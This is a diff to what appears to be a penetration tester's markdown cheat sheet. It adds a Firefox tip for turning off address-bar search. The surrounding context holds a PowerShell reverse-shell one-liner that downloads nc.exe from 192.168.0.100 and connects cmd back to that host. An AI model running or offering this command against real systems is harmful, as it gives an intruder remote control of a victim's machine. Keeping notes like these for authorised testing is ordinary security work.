@@ -327,6 +327,16 @@ reverse shell
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.100/nc.exe', 'C:\users\XXX\desktop\nc.exe');C:\users\XXX\desktop\nc.exe 192.168.0.100 80 -e cmd"
 ```
 
+### :open_file_folder: Firefox
+
+disable search in address bar function, easier to test
+
+```
+type in searchBar "about:config"
+Accept warning
+Search "keyword.enabled" and change it to false
+```
+
 ### :open_file_folder: others
 
 xxx is not recognized as an internal or external command, operable program or batch file.
